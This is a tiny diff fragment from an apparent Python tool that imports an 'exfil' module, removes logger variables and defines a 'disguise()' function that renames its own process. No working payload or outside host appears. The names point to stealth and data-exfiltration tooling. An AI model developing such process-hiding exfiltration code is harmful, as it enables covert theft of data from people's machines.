@@ -5,9 +5,6 @@ import setproctitle
 import threading
 import exfil
 
-logger = False
-logThread = 0
-
 def disguise():
 	setDisguise(getDisguise())
 	
